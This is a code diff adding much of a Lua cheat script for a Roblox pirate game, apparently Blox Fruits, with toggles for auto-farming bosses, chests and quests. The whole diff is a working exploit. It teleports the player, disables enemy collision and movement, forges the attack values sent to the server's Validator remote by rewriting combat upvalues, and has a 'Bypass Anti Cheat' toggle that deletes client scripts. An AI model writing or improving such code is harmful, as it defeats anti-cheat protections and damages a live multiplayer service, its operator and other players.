+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BoneQuestPos.Position).Magnitude > 1500 then
+							BTP(BoneQuestPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BoneQuestPos.Position).Magnitude < 1500 then
+							topos(BoneQuestPos);
+						end;
+					else
+						topos(BoneQuestPos);
+					end;
+					if (BoneQuestPos.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 1);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+								if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Demonic Soul") then
+										HealthMs = v.Humanoid.MaxHealth * _G.Kill_At / 100;
+										repeat
+											task.wait();
+											if v.Humanoid.Health <= HealthMs then
+												EquipWeapon(SelectWeaponGun);
+												TP1(v.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0));
+												UseSkill = true;
+												Skillaimbot = true;
+												((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer("TAP", Vector3.new(v.HumanoidRootPart.Position));
+											else
+												UseSkill = false;
+												Skillaimbot = false;
+												EquipWeapon(_G.SelectWeapon);
+												TP1(v.HumanoidRootPart.CFrame * Pos);
+											end;
+											PosMon = v.HumanoidRootPart.CFrame;
+											AimBotSkillPosition = PosMon.Position;
+											MonFarm = v.Name;
+											StartBring = true;
+											AutoHaki();
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											v.Humanoid.WalkSpeed = 0;
+											v.Head.CanCollide = false;
+											NormalAttack();
+										until not _G.Auto_Bone or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+										Skillaimbot = false;
+										UseSkill = false;
+									end;
+								end;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Toggle("Auto Random Surprise", _G.Auto_Random_Bone, "Auto Trade Bone", function(value)
+	_G.Auto_Random_Bone = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.Auto_Random_Bone then
+				wait(2);
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1);
+			end;
+		end;
+	end);
+end);
+MainTab:Toggle("Auto Pray", pry, false, function(value)
+	_G.Pray = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.Pray then
+				TP1(CFrame.new(-8652.99707, 143.450119, 6170.50879, -0.983064115, -0.000000000248005533, 0.18326205, -0.00000000178910387, 1, -0.00000000824392288, -0.18326205, -0.00000000843218029, -0.983064115));
+				wait();
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("gravestoneEvent", 1);
+			end;
+		end;
+	end);
+end);
+MainTab:Toggle("Auto Try Luck", Trylux, false, function(value)
+	_G.Trylux = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.Trylux then
+				TP1(CFrame.new(-8652.99707, 143.450119, 6170.50879, -0.983064115, -0.000000000248005533, 0.18326205, -0.00000000178910387, 1, -0.00000000824392288, -0.18326205, -0.00000000843218029, -0.983064115));
+				wait();
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("gravestoneEvent", 2);
+			end;
+		end;
+	end);
+end);
+MainTab:Seperator("Chest Farm");
+MainTab:Toggle("Auto Farm Chest [ Tween ]", _G.AutoFarmChest, "Auto Claim Chest Tween", function(value)
+	_G.AutoFarmChest = value;
+	StopTween(_G.AutoFarmChest);
+end);
+_G.MagnitudeAdd = 0;
+spawn(function()
+	while wait() do
+		if _G.AutoFarmChest then
+			for i, v in pairs((game:GetService("Workspace")):GetChildren()) do
+				if v.Name:find("Chest") then
+					if (game:GetService("Workspace")):FindFirstChild(v.Name) then
+						if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5000 + _G.MagnitudeAdd then
+							repeat
+								wait();
+								if (game:GetService("Workspace")):FindFirstChild(v.Name) then
+									topos(v.CFrame);
+								end;
+							until AutoFarmChest == false or (not v.Parent);
+							topos((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+							_G.MagnitudeAdd = _G.MagnitudeAdd + 1500;
+							break;
+						end;
+					end;
+				end;
+			end;
+		end;
+	end;
+end);
+MainTab:Toggle("Auto Farm Chest [ Teleport ]", false, "Auto Claim Chest Teleport", function(vu)
+	_G.ChestBypass = vu;
+end);
+MainTab:Toggle("Auto Stop Items", _G.StopItemsChest, "Stop When Get God's Chalice or FoD", function(vu)
+	_G.StopItemsChest = vu;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.StopItemsChest then
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("God's Chalice") or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") then
+					_G.ChestBypass = false;
+					topos((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+				end;
+			end;
+		end);
+	end;
+end);
+MainTab:Toggle("Auto Farm Chest Mirage island", false, "Auto Claim Chest Mirage", function(value)
+	_G.AutoChestMirage = value;
+	StopTween(_G.AutoChestMirage);
+end);
+_G.MagnitudeAdd = 0;
+spawn(function()
+	while wait() do
+		if _G.AutoChestMirage then
+			for i, v in pairs((game:GetService("Workspace")):GetChildren()) do
+				if v.Name:find("FragChest") then
+					if (game:GetService("Workspace")):FindFirstChild(v.Name) then
+						if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5000 + _G.MagnitudeAdd then
+							repeat
+								wait();
+								if (game:GetService("Workspace")):FindFirstChild(v.Name) then
+									topos(v.CFrame);
+								end;
+							until _G.AutoChestMirage == false or (not v.Parent);
+							topos((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+							_G.MagnitudeAdd = _G.MagnitudeAdd + 1500;
+							break;
+						end;
+					end;
+				end;
+			end;
+		end;
+	end;
+end);
+_G.MagnitudeAdd = 0;
+spawn(function()
+	while wait() do
+		if _G.ChestBypass then
+			for i, v in pairs((game:GetService("Workspace")):GetChildren()) do
+				if v.Name:find("Chest") then
+					if (game:GetService("Workspace")):FindFirstChild(v.Name) then
+						if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5000 + _G.MagnitudeAdd then
+							repeat
+								wait();
+								if (game:GetService("Workspace")):FindFirstChild(v.Name) then
+									TP3(v.CFrame);
+								end;
+							until AutoFarmChest == false or (not v.Parent);
+							topos((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+							_G.MagnitudeAdd = _G.MagnitudeAdd + 1500;
+							break;
+						end;
+					end;
+				end;
+			end;
+		end;
+	end;
+end);
+spawn(function()
+	while task.wait() do
+		if _G.ChestBypass then
+			local ohString1 = "SetTeam";
+			local ohString2 = "Pirates";
+			(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(ohString1, ohString2);
+		end;
+	end;
+end);
+MainTab:Seperator("Cake Farm");
+MainTab:Toggle("Auto Farm Cake Prince", _G.AutoDoughtBoss, "Auto Farm + Kill Cake Prince", function(value)
+	_G.AutoDoughtBoss = value;
+	StopTween(_G.AutoDoughtBoss);
+end);
+local CakePos = CFrame.new(-2091.911865234375, 70.00884246826172, -12142.8359375);
+spawn(function()
+	while wait() do
+		if _G.AutoDoughtBoss then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Prince") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Cake Prince" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.AutoDoughtBoss or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Cake Prince [Lv. 2300] [Raid Boss]") then
+					topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Cake Prince [Lv. 2300] [Raid Boss]")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+				elseif (game:GetService("Workspace")).Map.CakeLoaf.BigMirror.Other.Transparency == 1 then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Cookie Crafter") or (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Guard") or (game:GetService("Workspace")).Enemies:FindFirstChild("Baking Staff") or (game:GetService("Workspace")).Enemies:FindFirstChild("Head Baker") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										StartBring = true;
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+									until not _G.AutoDoughtBoss or (not v.Parent) or v.Humanoid.Health <= 0 or (game:GetService("Workspace")).Map.CakeLoaf.BigMirror.Other.Transparency == 0 or (game:GetService("ReplicatedStorage")):FindFirstChild("Cake Prince [Lv. 2300] [Raid Boss]") or (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Prince [Lv. 2300] [Raid Boss]");
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CakePos.Position).Magnitude > 1500 then
+								BTP(CakePos);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CakePos.Position).Magnitude < 1500 then
+								topos(CakePos);
+							end;
+						else
+							topos(CakePos);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-2091.911865234375, 70.00884246826172, -12142.8359375));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Toggle("Auto Spawn Cake Prince", _G.AutoSpawnCP, false, function(value)
+	_G.AutoSpawnCP = value;
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoSpawnCP then
+			(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner", true);
+		end;
+	end;
+end);
+MainTab:Toggle("Auto Kill Cake Prince", _G.AutoCakePrince, false, function(value)
+	_G.AutoCakePrince = value;
+	StopTween(_G.AutoCakePrince);
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoCakePrince and World3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Prince") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Cake Prince" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.AutoCakePrince or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					UnEquipWeapon(_G.SelectWeapon);
+				end;
+			end);
+		end;
+	end;
+end);
+MainTab:Toggle("Auto Kill Dough King", _G.Autodoughking, false, function(value)
+	_G.Autodoughking = value;
+	StopTween(_G.Autodoughking);
+end);
+spawn(function()
+	while wait() do
+		if _G.Autodoughking and World3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Dough King") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Dough King" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Autodoughking or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+SettingsTab:Seperator("Settings");
+SettingsTab:Toggle("Spin Position", false, "Spin Position When Farm", function(v)
+	_G.SpinPos = v;
+end);
+PosY = 35;
+SettingsTab:Slider("Farm Distnace", 0, 50, PosY, function(value)
+	PosY = value;
+end);
+TweenSpeed = 350;
+SettingsTab:Slider("Player Tween Speed", 0, 350, TweenSpeed, function(value)
+	TweenSpeed = value;
+end);
+SettingsTab:Toggle("Bring Mob", true, false, function(Mag)
+	_G.BringMonster = Mag;
+end);
+local Bring = {
+	"Low",
+	"Normal",
+	"High"
+};
+_G.BringMode = "Normal";
+SettingsTab:Dropdown("BringMob Mode", Bring, _G.BringMode, function(value)
+	_G.BringMode = value;
+end);
+spawn(function()
+	while wait(0.1) do
+		if _G.BringMode then
+			pcall(function()
+				if _G.BringMode == "Low" then
+					_G.BringMode = 350;
+				elseif _G.BringMode == "Normal" then
+					_G.BringMode = 500;
+				elseif _G.BringMode == "High" then
+					_G.BringMode = 800;
+				end;
+			end);
+		end;
+	end;
+end);
+SettingsTab:Toggle("Fast Attack", true, "Fast Attack", function(value)
+	_G.FastAttack = value;
+end);
+SettingsTab:Toggle("Attack Aura", false, "Attack Mob", function(value)
+	_G.AttackMob = value;
+end);
+spawn(function()
+	while wait(_G.FastAttackDelay) do
+		if _G.AttackMob and (not _G.AutoFarmFruitMastery) and (not _G.AutoFarmGunMastery) then
+			pcall(function()
+				AttackNoCD();
+			end);
+		end;
+	end;
+end);
+local PBlade = game.Players.LocalPlayer;
+local QBlade = getupvalues(require(PBlade.PlayerScripts.CombatFramework));
+local RBlade = QBlade[2];
+function GetCurrentBlade()
+	local S = RBlade.activeController;
+	local T = S.blades[1];
+	if not T then
+		return;
+	end;
+	while T.Parent ~= game.Players.LocalPlayer.Character do
+		T = T.Parent;
+	end;
+	return T;
+end;
+function AttackNoCD()
+	if not _G.AutoFarmFruitMastery or (not _G.AutoFarmGunMastery) then
+		if _G.FastAttack then
+			local U = RBlade.activeController;
+			for h = 1, 1 do
+				local V = (require(game.ReplicatedStorage.CombatFramework.RigLib)).getBladeHits(PBlade.Character, {
+					PBlade.Character.HumanoidRootPart
+				}, 60);
+				local W = {};
+				local X = {};
+				for k, i in pairs(V) do
+					if i.Parent:FindFirstChild("HumanoidRootPart") and (not X[i.Parent]) then
+						table.insert(W, i.Parent.HumanoidRootPart);
+						X[i.Parent] = true;
+					end;
+				end;
+				V = W;
+				if #V > 0 then
+					local Y = debug.getupvalue(U.attack, 5);
+					local Z = debug.getupvalue(U.attack, 6);
+					local _ = debug.getupvalue(U.attack, 4);
+					local a0 = debug.getupvalue(U.attack, 7);
+					local a1 = (Y * 798405 + _ * 727595) % Z;
+					local a2 = _ * 798405;
+					(function()
+						a1 = (a1 * Z + a2) % 1099511627776;
+						Y = math.floor(a1 / Z);
+						_ = a1 - Y * Z;
+					end)();
+					a0 = a0 + 1;
+					debug.setupvalue(U.attack, 5, Y);
+					debug.setupvalue(U.attack, 6, Z);
+					debug.setupvalue(U.attack, 4, _);
+					debug.setupvalue(U.attack, 7, a0);
+					pcall(function()
+						if PBlade.Character:FindFirstChildOfClass("Tool") and U.blades and U.blades[1] then
+							U.animator.anims.basic[1]:Play(0.01, 0.01, 0.01);
+							(game:GetService("ReplicatedStorage")).RigControllerEvent:FireServer("weaponChange", tostring(GetCurrentBlade()));
+							game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(a1 / 1099511627776 * 16777215), a0);
+							(game:GetService("ReplicatedStorage")).RigControllerEvent:FireServer("hit", V, h, "");
+						end;
+					end);
+				end;
+			end;
+		else
+			(game:GetService("VirtualUser")):CaptureController();
+			(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+		end;
+	end;
+end;
+local AttackList = {
+	0,
+	0.1,
+	0.15,
+	0.165,
+	0.175,
+	0.2,
+	0.25
+};
+_G.FastAttackDelay = 0.2;
+SettingsTab:Dropdown("Fast Attack Delay", AttackList, _G.FastAttackDelay, function(v)
+	_G.FastAttackDelay = v;
+end);
+SettingsTab:Seperator("Graphic");
+SettingsTab:Toggle("Hide Notifications", false, "Invisible Notification", function(v)
+	_G.HideNotification = v;
+end);
+spawn(function()
+	while wait() do
+		if _G.HideNotification then
+			game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = false;
+		else
+			game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = true;
+		end;
+	end;
+end);
+SettingsTab:Toggle("Hide Damage Text", true, "Invisible Damage Text", function(Remo)
+	_G.KobenHeegeen = Remo;
+end);
+spawn(function()
+	while wait() do
+		if _G.KobenHeegeen then
+			(game:GetService("ReplicatedStorage")).Assets.GUI.DamageCounter.Enabled = false;
+		else
+			(game:GetService("ReplicatedStorage")).Assets.GUI.DamageCounter.Enabled = true;
+		end;
+	end;
+end);
+SettingsTab:Toggle("Black Screen", false, false, function(Umm)
+	_G.StartBlackScreen = Umm;
+end);
+spawn(function()
+	while wait() do
+		if _G.StartBlackScreen then
+			(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Blackscreen.Size = UDim2.new(500, 0, 500, 500);
+		else
+			(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Blackscreen.Size = UDim2.new(1, 0, 500, 500);
+		end;
+	end;
+end);
+SettingsTab:Toggle("White Screen", _G.WhiteScreen, false, function(value)
+	_G.WhiteScreen = value;
+	if _G.WhiteScreen == true then
+		(game:GetService("RunService")):Set3dRenderingEnabled(false);
+	elseif _G.WhiteScreen == false then
+		(game:GetService("RunService")):Set3dRenderingEnabled(true);
+	end;
+end);
+-- spawn(function()
+-- 	for i, v in pairs(game:GetDescendants()) do
+-- 		if v:IsA("ParticleEmitter") or v:IsA("Trail") then
+-- 			v.Lifetime = NumberRange.new(0);
+-- 		elseif v:IsA("Explosion") then
+-- 			v.BlastPressure = 1;
+-- 			v.BlastRadius = 1;
+-- 		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+-- 			v.Enabled = false;
+-- 		end;
+-- 	end;
+-- end);
+SettingsTab:Toggle("Hide Monsters", _G.inv, "Invisible Monstera", function(value)
+	_G.inv = value;
+	while wait() do
+		if _G.inv then
+			pcall(function()
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetDescendants()) do
+					if v.ClassName == "MeshPart" then
+						v.Transparency = 1;
+					end;
+				end;
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetDescendants()) do
+					if v.Name == "Head" then
+						v.Transparency = 1;
+					end;
+				end;
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetDescendants()) do
+					if v.ClassName == "Accessory" then
+						v.Handle.Transparency = 1;
+					end;
+				end;
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetDescendants()) do
+					if v.ClassName == "Decal" then
+						v.Transparency = 1;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+SettingsTab:Seperator("Mastery Setting");
+_G.Kill_At = 25;
+SettingsTab:Slider("Kill At %", 1, 100, _G.Kill_At, function(value)
+	_G.Kill_At = value;
+end);
+SettingsTab:Toggle("Skill Z", true, "Auto Skill Z", function(value)
+	_G.SkillZ = value;
+end);
+SettingsTab:Toggle("Skill X", true, "Auto Skill X", function(value)
+	_G.SkillX = value;
+end);
+SettingsTab:Toggle("Skill C", true, "Auto Skill C", function(value)
+	_G.SkillC = value;
+end);
+SettingsTab:Toggle("Skill V", false, "Auto Skill V", function(value)
+	_G.SkillV = value;
+end);
+SettingsTab:Toggle("Skill F", false, "Auto Skill F", function(value)
+	_G.SkillF = value;
+end);
+SettingsTab:Seperator("Other");
+SettingsTab:Toggle("Bypass Tp", false, "Safe Teleport", function(Fast)
+	BypassTP = Fast;
+end);
+SettingsTab:Toggle("Auto Set Spawn Point", true, "Set Spawn Point", function(value)
+	_G.Set = value;
+end);
+spawn(function()
+	while wait(1) do
+		if _G.Set then
+			pcall(function()
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetSpawnPoint");
+			end);
+		end;
+	end;
+end);
+SettingsTab:Toggle("Auto Haki", false, "Auto Active Buso", function(value)
+	_G.AutoHaki = value;
+end);
+spawn(function()
+	while wait(0.1) do
+		if _G.AutoHaki then
+			if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
+				local args = {
+					[1] = "Buso"
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end;
+		end;
+	end;
+end);
+SettingsTab:Toggle("Bypass Anti Cheat", true, "Reset Flags", function(x)
+	_G.ResetFlags = x;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.ResetFlags then
+				for i, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetDescendants()) do
+					if v:IsA("LocalScript") then
+						if v.Name == "General" or v.Name == "Shiftlock" or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
+							v:Destroy();
+						end;
+					end;
+				end;
+				for i, v in pairs((game:GetService("Players")).LocalPlayer.PlayerScripts:GetDescendants()) do
+					if v:IsA("LocalScript") then
+						if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans" or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp" or v.Name == "PlayerList" then
+							v:Destroy();
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+HoldTab:Seperator("Mastery");
+_G.HoldSKillZ = 0;
+HoldTab:Slider("SKill Z", 0, 5, _G.HoldSKillZ, function(v)
+	_G.HoldSKillZ = v;
+end);
+_G.HoldSKillX = 0;
+HoldTab:Slider("SKill X", 0, 5, _G.HoldSKillX, function(v)
+	_G.HoldSKillX = v;
+end);
+_G.HoldSKillC = 0;
+HoldTab:Slider("SKill C", 0, 5, _G.HoldSKillC, function(v)
+	_G.HoldSKillC = v;
+end);
+_G.HoldSKillV = 0;
+HoldTab:Slider("SKill V", 0, 5, _G.HoldSKillV, function(v)
+	_G.HoldSKillV = v;
+end);
+_G.HoldSKillF = 0;
+HoldTab:Slider("SKill F", 0, 5, _G.HoldSKillF, function(v)
+	_G.HoldSKillF = v;
+end);
+HoldTab:Seperator("Sea Event");
+_G.SeaHoldSKillZ = 0;
+HoldTab:Slider("SKill Z", 0, 5, _G.SeaHoldSKillZ, function(v)
+	_G.SeaHoldSKillZ = v;
+end);
+_G.SeaHoldSKillX = 0;
+HoldTab:Slider("SKill X", 0, 5, _G.SeaHoldSKillX, function(v)
+	_G.SeaHoldSKillX = v;
+end);
+_G.SeaHoldSKillC = 0;
+HoldTab:Slider("SKill C", 0, 5, _G.SeaHoldSKillC, function(v)
+	_G.SeaHoldSKillC = v;
+end);
+_G.SeaHoldSKillV = 0;
+HoldTab:Slider("SKill V", 0, 5, _G.SeaHoldSKillV, function(v)
+	_G.SeaHoldSKillV = v;
+end);
+_G.SeaHoldSKillF = 0;
+HoldTab:Slider("SKill F", 0, 5, _G.SeaHoldSKillF, function(v)
+	_G.SeaHoldSKillF = v;
+end);
+if World1 or World2 then
+	ItemsTab:Seperator("World");
+end;
+if World1 then
+	ItemsTab:Toggle("Auto Second Sea", _G.AutoSecondSea, false, function(value)
+		_G.AutoSecondSea = value;
+		StopTween(_G.AutoSecondSea);
+	end);
+	spawn(function()
+		while wait() do
+			if _G.AutoSecondSea then
+				pcall(function()
+					local MyLevel = (game:GetService("Players")).LocalPlayer.Data.Level.Value;
+					if MyLevel >= 700 and World1 then
+						if (game:GetService("Workspace")).Map.Ice.Door.CanCollide == false and (game:GetService("Workspace")).Map.Ice.Door.Transparency == 1 then
+							local CFrame1 = CFrame.new(4849.29883, 5.65138149, 719.611877);
+							repeat
+								topos(CFrame1);
+								wait();
+							until (CFrame1.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or _G.AutoSecondSea == false;
+							wait(1.1);
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Detective");
+							wait(0.5);
+							EquipWeapon("Key");
+							repeat
+								topos(CFrame.new(1347.7124, 37.3751602, -1325.6488));
+								wait();
+							until (Vector3.new(1347.7124, 37.3751602, (-1325.6488)) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or _G.AutoSecondSea == false;
+							wait(0.5);
+						elseif (game:GetService("Workspace")).Map.Ice.Door.CanCollide == false and (game:GetService("Workspace")).Map.Ice.Door.Transparency == 1 then
+							if (game:GetService("Workspace")).Enemies:FindFirstChild("Ice Admiral") then
+								for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+									if v.Name == "Ice Admiral" then
+										if not v.Humanoid.Health <= 0 then
+											if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+												OldCFrameSecond = v.HumanoidRootPart.CFrame;
+												repeat
+													task.wait(_G.FastAttackDelay);
+													AutoHaki();
+													EquipWeapon(_G.SelectWeapon);
+													v.HumanoidRootPart.CanCollide = false;
+													v.Humanoid.WalkSpeed = 0;
+													v.Head.CanCollide = false;
+													v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+													v.HumanoidRootPart.CFrame = OldCFrameSecond;
+													topos(v.HumanoidRootPart.CFrame * Pos);
+													AttackNoCD();
+													sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+												until not _G.AutoSecondSea or (not v.Parent) or v.Humanoid.Health <= 0;
+											end;
+										else
+											(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelDressrosa");
+										end;
+									end;
+								end;
+							elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Ice Admiral") then
+								topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Ice Admiral")).HumanoidRootPart.CFrame * CFrame.new(5, 10, 7));
+							end;
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World2 then
+	ItemsTab:Toggle("Auto Third Sea", _G.AutoThirdSea, false, function(value)
+		_G.AutoThirdSea = value;
+		StopTween(_G.AutoThirdSea);
+	end);
+	spawn(function()
+		while wait() do
+			if _G.AutoThirdSea then
+				pcall(function()
+					if (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 1500 and World2 then
+						_G.AutoFarm = false;
+						if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ZQuestProgress", "General") == 0 then
+							topos(CFrame.new(-1926.3221435547, 12.819851875305, 1738.3092041016));
+							if ((CFrame.new((-1926.3221435547), 12.819851875305, 1738.3092041016)).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+								wait(1.5);
+								(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin");
+							end;
+							wait(1.8);
+							if (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra") then
+								for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+									if v.Name == "rip_indra" then
+										OldCFrameThird = v.HumanoidRootPart.CFrame;
+										repeat
+											task.wait(_G.FastAttackDelay);
+											AutoHaki();
+											EquipWeapon(_G.SelectWeapon);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.CFrame = OldCFrameThird;
+											v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+											v.HumanoidRootPart.CanCollide = false;
+											v.Humanoid.WalkSpeed = 0;
+											AttackNoCD();
+											(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelZou");
+										until _G.AutoThirdSea == false or v.Humanoid.Health <= 0 or (not v.Parent);
+									end;
+								end;
